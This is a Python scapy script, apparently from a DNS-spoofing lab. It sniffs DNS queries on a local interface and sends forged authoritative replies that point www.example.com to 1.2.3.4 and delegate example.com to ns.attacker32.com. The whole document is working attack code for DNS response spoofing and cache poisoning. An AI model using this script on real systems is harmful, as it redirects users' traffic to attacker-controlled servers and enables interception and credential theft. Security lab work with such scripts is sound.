#!/usr/bin/env python3
from scapy.all import *

def spoof_dns(pkt):
  if (DNS in pkt and 'www.example.com' in pkt[DNS].qd.qname.decode('utf-8')):
    pkt.show()
   # Interchange the source and destination IP address
    IPpacket = IP(dst=pkt[IP].src, src=pkt[IP].dst)

    # Interchange the source and destination port number
    UDPpacket = UDP(dport=pkt[UDP].sport, sport=53)

    # The Answer Field
    AnsField = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                 ttl=259200, rdata='1.2.3.4')

    # The Authority Field
    NameField = DNSRR(rrname='example.com', type='NS',
                   ttl=259200, rdata='ns.attacker32.com')

    # Make DNS packet
    DNSpacket = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,  
                 qdcount=1, ancount=1, nscount=0, arcount=0,
                 an=AnsField, ns=NameField)

    # Build entire IP packet and send 
    spoofpacket = IPpacket/UDPpacket/DNSpacket
    send(spoofpacket)

# Sniff UDP query packets and call spoof_dns().
f = 'udp and src host 10.9.0.53 and dst port 53'
pkt = sniff(iface='br-04f7f40bc5a1', filter=f, prn=spoof_dns)      
